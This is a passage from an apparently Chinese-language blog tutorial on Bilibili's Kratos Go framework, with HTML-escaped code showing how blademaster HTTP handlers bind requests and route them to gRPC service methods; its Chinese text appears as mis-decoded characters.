	&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;_&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;err&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;:=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;svc&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;Ping&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;ctx&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;nil&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;err&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;!=&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;nil&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
		&lt;span class=&#34;nx&#34;&gt;log&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;Error&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;ping error(%v)&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;err&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
		&lt;span class=&#34;nx&#34;&gt;ctx&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;AbortWithStatus&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;http&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;StatusServiceUnavailable&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
	&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;

&lt;span class=&#34;c1&#34;&gt;// example for http request handler.
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;kd&#34;&gt;func&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;howToStart&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;c&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;bm&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;Context&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
	&lt;span class=&#34;nx&#34;&gt;k&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;:=&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;model&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;Kratos&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
		&lt;span class=&#34;nx&#34;&gt;Hello&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;Golang å¤§æ³•å¥½ !!!æˆ‘å¥½ä½ ä¸ªå¤´ï¼&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
	&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
	&lt;span class=&#34;nx&#34;&gt;c&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;JSON&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;k&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;nil&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;å¦‚æœä½ ä½¿ç”¨è¿‡&lt;code&gt;gin&lt;/code&gt;è¿™ä¸ªwebæ¡†æ¶, ä¸Šé¢çš„ä»£ç ä½ ä¸€å®šå¾ˆç†Ÿæ‚‰ï¼Œå¯¹å§ï¼Ÿ
&lt;code&gt;bm&lt;/code&gt;å°±æ˜¯&lt;code&gt;gin&lt;/code&gt;ï¼Œåªæ˜¯éƒ¨åˆ†ä»£ç è¢«Bilibilié­”æ”¹äº†ï¼Œæ•´ä½“æ¶æ„æ˜¯ä¸å˜çš„ã€‚&lt;/p&gt;
&lt;p&gt;OKï¼Œæˆ‘ä»¬çœ‹çœ‹&lt;code&gt;RegisterDemoBMServer&lt;/code&gt;é‡Œåšäº†ä»€ä¹ˆ.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-go&#34; data-lang=&#34;go&#34;&gt;&lt;span class=&#34;c1&#34;&gt;// DemoBMServer is the server API for Demo service.
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;kd&#34;&gt;type&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;DemoBMServer&lt;/span&gt; &lt;span class=&#34;kd&#34;&gt;interface&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
	&lt;span class=&#34;nf&#34;&gt;Ping&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;ctx&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;context&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;Context&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;req&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;google_protobuf1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;Empty&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;resp&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;google_protobuf1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;Empty&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;err&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;error&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;

	&lt;span class=&#34;nf&#34;&gt;SayHello&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;ctx&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;context&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;Context&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;req&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;HelloReq&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;resp&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;google_protobuf1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;Empty&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;err&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;error&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;

	&lt;span class=&#34;nf&#34;&gt;SayHelloURL&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;ctx&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;context&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;Context&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;req&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;HelloReq&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;resp&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;HelloResp&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;err&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;error&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;

&lt;span class=&#34;c1&#34;&gt;// æˆ‘ä»¬å†™çš„gRPCæœåŠ¡
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;kd&#34;&gt;var&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;DemoSvc&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;DemoBMServer&lt;/span&gt;
&lt;span class=&#34;c1&#34;&gt;// ------------------------------------------------
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;
&lt;span class=&#34;c1&#34;&gt;// æˆ‘ä»¬ä»”ç»†åˆ†æè¿™äº›æ–¹æ³•ä¸éš¾å‘ç°
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;// ä»–ä»¬éƒ½ä¼šè°ƒç”¨ `BindWith` å’Œå¯¹åº”çš„gRPCæ–¹æ³•
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;
&lt;span class=&#34;c1&#34;&gt;// å…ˆä½¿ç”¨BindWith: å°†requestä¸­çš„`Body` è½¬åŒ–ä¸ºgoä¸­çš„ `struct`
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;// ç„¶åä½¿ç”¨gRPCæ–¹æ³•å¤„ç†è¯·æ±‚æ•°æ®
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;// æœ€åè¿”å›
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;
&lt;span class=&#34;c1&#34;&gt;// æœ¬è´¨å°±æ˜¯é€šè¿‡httpè°ƒç”¨gRPCæœåŠ¡
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;
&lt;span class=&#34;kd&#34;&gt;func&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;demoPing&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;c&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;bm&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;Context&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
	&lt;span class=&#34;nx&#34;&gt;p&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;:=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;new&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;google_protobuf1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;Empty&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
	&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;err&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;:=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;c&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;BindWith&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;binding&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;Default&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;c&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;Request&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;Method&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;c&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;Request&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;Header&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;Get&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;Content-Type&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)));&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;err&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;!=&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;nil&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
		&lt;span class=&#34;k&#34;&gt;return&lt;/span&gt;
	&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
	&lt;span class=&#34;nx&#34;&gt;resp&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;err&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;:=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;DemoSvc&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;Ping&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;c&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
	&lt;span class=&#34;nx&#34;&gt;c&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;JSON&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;resp&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;err&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;

&lt;span class=&#34;kd&#34;&gt;func&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;demoSayHello&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;c&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;bm&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;Context&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
	&lt;span class=&#34;nx&#34;&gt;p&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;:=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;new&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;HelloReq&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
	&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;err&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;:=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;c&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;BindWith&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;binding&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;Default&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;c&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;Request&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;Method&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;c&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;Request&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;Header&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;Get&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;Content-Type&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)));&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;err&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;!=&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;nil&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
		&lt;span class=&#34;k&#34;&gt;return&lt;/span&gt;
	&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
	&lt;span class=&#34;nx&#34;&gt;resp&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;err&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;:=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;DemoSvc&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;SayHello&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;c&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
	&lt;span class=&#34;nx&#34;&gt;c&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;JSON&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;resp&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;err&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;

&lt;span class=&#34;kd&#34;&gt;func&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;demoSayHelloURL&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;c&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;bm&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;Context&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
	&lt;span class=&#34;nx&#34;&gt;p&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;:=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;new&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;HelloReq&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
	&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;err&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;:=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;c&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;BindWith&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;binding&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;Default&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;c&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;Request&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;Method&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;c&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;Request&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;Header&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;Get&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;Content-Type&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)));&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;err&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;!=&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;nil&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
		&lt;span class=&#34;k&#34;&gt;return&lt;/span&gt;
	&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
	&lt;span class=&#34;nx&#34;&gt;resp&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;err&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;:=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;DemoSvc&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;SayHelloURL&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;c&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
	&lt;span class=&#34;nx&#34;&gt;c&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;JSON&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;resp&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;err&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;span class=&#34;c1&#34;&gt;//-------------------------------------
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;
&lt;span class=&#34;c1&#34;&gt;// RegisterDemoBMServer Register the blademaster route
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;kd&#34;&gt;func&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;RegisterDemoBMServer&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;e&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;bm&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;Engine&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;server&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;DemoBMServer&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
	&lt;span class=&#34;c1&#34;&gt;// server æ˜¯æˆ‘ä»¬ä¹‹å‰ç¼–å†™çš„gRPCæœåŠ¡
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;	&lt;span class=&#34;nx&#34;&gt;DemoSvc&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;server&lt;/span&gt;
	
	&lt;span class=&#34;c1&#34;&gt;// å°†ä¸€äº›æ–¹æ³•æ³¨å†Œåˆ°è·¯ç”±é‡Œå» 
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;	&lt;span class=&#34;nx&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;GET&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;/demo.service.v1.Demo/Ping&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;demoPing&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
	&lt;span class=&#34;nx&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;GET&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;/demo.service.v1.Demo/SayHello&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;demoSayHello&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
	&lt;span class=&#34;nx&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;GET&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;/kratos-demo/say_hello&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;demoSayHelloURL&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
